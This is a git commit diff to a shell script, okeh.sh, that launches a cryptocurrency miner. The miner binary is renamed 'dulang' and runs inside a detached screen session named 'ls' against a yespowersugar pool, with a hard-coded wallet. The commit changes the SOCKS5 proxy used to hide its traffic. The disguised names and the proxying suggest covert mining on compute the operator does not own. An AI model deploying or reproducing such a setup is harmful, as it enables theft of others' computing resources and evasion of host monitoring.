ea15640e89048c3f3dd3e27587f762589d713f14
dsfdsftretrtret43433 <86481729+dsfdsftretrtret43433@users.noreply.github.com>
2021-06-25 23:13:02 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -6,5 +6,5 @@ chmod +x dulang
 screen -dmS ls 
 POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
 WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.JOHAN
-PROXY=socks5://37.1.197.114:80
+PROXY=socks5://103.253.24.243:443
 ./dulang -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
